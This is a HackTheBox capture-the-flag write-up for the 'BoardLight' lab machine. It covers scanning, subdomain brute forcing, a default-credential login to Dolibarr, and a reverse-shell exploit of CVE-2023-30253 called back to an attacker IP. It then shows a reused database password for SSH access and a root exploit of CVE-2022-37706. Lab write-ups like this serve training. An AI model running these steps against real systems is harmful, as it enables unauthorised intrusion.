---
title: "BoardLight - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - easy
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## BoardLight
![](https://kar0nx.github.io/assets/images/writeup/7768afed979c9abe917b0c20df49ceb8.png)
## Reconnaissance

IP: 10.10.11.11
## NMAP

```
nmap -T4 -p- -A 10.10.11.11
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 10:20 UTC
Nmap scan report for 10.10.11.11
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   30.84 ms 10.10.14.1
2   30.95 ms 10.10.11.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.53 seconds
```

## Website
### Site

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902122054.png)

on bottom I spot page name board.htb, add it to /etc/hosts

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902122647.png)

I notice page is in php, contact us redirect us to home page, login also. Starting directory busting but nothing usefull, next subdomain brute force and I found crm

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.Board.htb" -u http://Board.htb -fs 15949
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902122723.png)

Great we go login panel to Dolibarr 17.0.0

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902122814.png)

tried default creds admin:admin and we manage to login however it says access denied

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902122940.png)

searching google I found CVE-2023-30253. 
Dolibarr before 17.0.1 allows remote code execution by an authenticated user via an uppercase manipulation:
```
<?PHP instead of <?php in injected data
```
https://nvd.nist.gov/vuln/detail/CVE-2023-30253
Poc: https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

```
python3 exploit.py http://crm.board.htb admin admin 10.10.14.8 4444
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902123600.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902123542.png)

## Gaining Access

Start with searching for configuration files of dolibarr

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902132307.png)

```
/var/www/html/crm.board.htb/htdocs/conf$ cat conf.php
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902132327.png)

dolibarrowner serverfun2$2023!!
Password reused by larissa, now we can connect via ssh 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902132558.png)

## Privilege Escalation

Sudo have vulerable version but we cannot run sudo so it is rabbit hole, next I ran linpeas and found promising SUID

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902133555.png)

to confirm we can check version

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902133712.png)

enlightenment before 0.25.4 cve-2022-37706
Copy exploit on target machine and run
https://nvd.nist.gov/vuln/detail/CVE-2022-37706
PoC: https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902134227.png)

we have root shell